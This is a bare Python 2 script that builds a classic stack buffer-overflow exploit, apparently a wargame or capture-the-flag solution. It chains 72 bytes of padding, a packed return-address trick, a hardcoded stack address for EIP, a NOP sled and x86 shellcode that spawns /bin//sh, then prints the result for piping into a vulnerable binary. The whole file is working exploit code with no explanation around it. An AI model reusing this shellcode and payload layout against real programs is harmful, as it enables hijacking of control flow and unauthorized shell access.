import struct 
pattern = "A" * 72 + "BBBB" + "CCCC"
trick = struct.pack("I", 0x0804853e)
eip = struct.pack("I", 0xbffff760+30)
trash = "\x90" * 100
payload = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
gg = "\xCC\xCC\xCC\xCC"

print pattern +trick + eip + trash +payload
